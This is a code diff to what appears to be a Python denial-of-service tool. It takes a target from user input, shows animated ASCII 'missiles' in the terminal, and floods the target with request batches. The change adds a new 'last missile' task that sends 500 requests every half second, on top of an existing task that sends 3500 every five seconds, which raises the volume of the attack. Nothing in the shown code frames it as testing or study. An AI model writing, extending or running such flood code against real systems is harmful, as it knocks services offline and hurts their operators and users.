@@ -47,6 +47,7 @@ MISSILE_BATCHES = {
 }
 
 ULTRA_SUPER_BATCH = 3500  # new missile every 5s
+LAST_BATCH = 500          # new missile every 0.5s
 
 class Missile:
     def __init__(self, speed=None):
@@ -79,12 +80,10 @@ def draw_missiles(missiles):
             for i, line in enumerate(MISSILE_BODY):
                 pos = missile.y - len(MISSILE_BODY) + i
                 if 0 <= pos < TERMINAL_HEIGHT:
-                    # only display batch beside first line
                     if i == 0:
                         buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                     else:
                         buffer[pos] += " " * missile.x + line
-            # exhaust at bottom
             exhaust_pos = missile.y
             if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                 buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
@@ -109,6 +108,13 @@ async def ultra_super_missile(target, duration):
         asyncio.create_task(send_requests(target, ULTRA_SUPER_BATCH))
         await asyncio.sleep(5)
 
+# Last missile every 0.5s
+async def last_missile(target, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        asyncio.create_task(send_requests(target, LAST_BATCH))
+        await asyncio.sleep(0.5)
+
 # Main loop
 async def main():
     target = input("¿TARGZ > ")
@@ -118,8 +124,9 @@ async def main():
 
     missiles = [Missile() for _ in range(2)]  # mini swarm
 
-    # Start ultra-super missile task
+    # Start heavy missiles
     asyncio.create_task(ultra_super_missile(target, duration))
+    asyncio.create_task(last_missile(target, duration))
 
     start_time = time.time()
     last_launch_times = [0]*len(missiles)
